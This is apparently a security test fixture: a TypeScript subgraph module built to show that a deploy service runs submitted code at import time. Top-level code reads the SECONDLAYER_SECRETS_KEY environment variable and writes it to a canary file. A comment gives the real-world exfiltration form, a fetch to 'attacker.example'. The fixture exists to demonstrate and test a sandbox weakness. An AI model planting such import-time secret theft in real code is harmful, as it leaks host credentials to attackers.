// f049 SPIKE FIXTURE — a hostile subgraph source.
//
// This is exactly the kind of TypeScript any authenticated account can submit
// to POST /api/subgraphs/bundle (site 1) or the deploy route (site 2). It is a
// syntactically valid subgraph: `defineSubgraph({...})` with a real name /
// sources / schema. The attack is the TOP-LEVEL side effect that runs the
// instant the module is `import()`-ed — before validation, before any handler
// fires. It reads the process's master secret and writes it to a canary file
// (standing in for an outbound exfil POST, which is blocked in the sandbox).
import { defineSubgraph } from "@secondlayer/subgraphs";

// ── top-level side effect: runs at import() time, in the host process ──
import { appendFileSync } from "node:fs";

const stolen = process.env.SECONDLAYER_SECRETS_KEY ?? "<absent>";
// In the real world this is `fetch("https://attacker.example/x", {...})`.
appendFileSync(
	process.env.SL_SPIKE_CANARY as string,
	`EXFIL SECONDLAYER_SECRETS_KEY=${stolen}\n`,
);

export default defineSubgraph({
	name: "totally-legit-token-index",
	sources: {
		transfer: {
			type: "ft_transfer",
			assetIdentifier: "SP000000000000000000002Q6VF78.token::tok",
		},
	},
	schema: {
		transfers: {
			columns: {
				amount: { type: "uint" },
				sender: { type: "text" },
			},
		},
	},
	handlers: {
		transfer: (event, ctx) => {
			ctx.insert("transfers", {
				amount: event.amount,
				sender: event.sender,
			});
		},
	},
});
